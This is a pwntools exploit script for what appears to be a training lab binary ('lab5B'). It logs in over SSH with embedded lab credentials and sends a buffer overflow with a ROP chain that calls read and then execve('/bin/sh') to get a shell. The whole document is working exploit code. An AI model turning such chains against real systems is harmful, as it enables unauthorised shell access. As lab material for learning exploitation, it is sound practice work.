from pwn import *

context.terminal = [ 'tmux', 'splitw','-h' ]

# local
#p = process("./lab5B")
#gdb.attach(p, "b *0x08048e89")

# remote
s = ssh(host='192.168.203.146', user='lab5B', password='s0m3tim3s_r3t2libC_1s_3n0ugh')
p = s.process('/levels/lab05/./lab5B')
gdb.attach(p, 'b main')

#gadgets
pop_eax = 0x080bbf26 
pop_ebx = 0x080481c9
pop_ecx = 0x080e55ad
pop_edx = 0x0806ec5a
int_80 = 0x0806f31f # nop; int 0x80
ret = 0x080481b2
binsh = 0x80ec000

# functions
# missing system
read_f = 0x806d100

# read(1, [address], 8)
# eax = 3
# ebx = 0
# ecx = 0x80ec000 # heap
# edx = 8

# execv( '/bin/sh', 0, 0)
# eax = 11
# ebx = /bin/sh
# ecx = 0
# edx = 0

# overflow
payload = ""
payload += "A" * 140

# read
payload += p32(pop_eax)
payload += p32(0x3)
payload += p32(pop_ebx)
payload += p32(0x0)
payload += p32(pop_ecx)
payload += p32(binsh)
payload += p32(pop_edx)
payload += p32(0x7)
payload += p32(int_80) 

# execv()
payload += p32(pop_eax)
payload += p32(0xb)
payload += p32(pop_ebx)
payload += p32(binsh)
payload += p32(pop_ecx)
payload += p32(0x0)
payload += p32(pop_edx)
payload += p32(0x0)
payload += p32(int_80)




print p.recv()
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
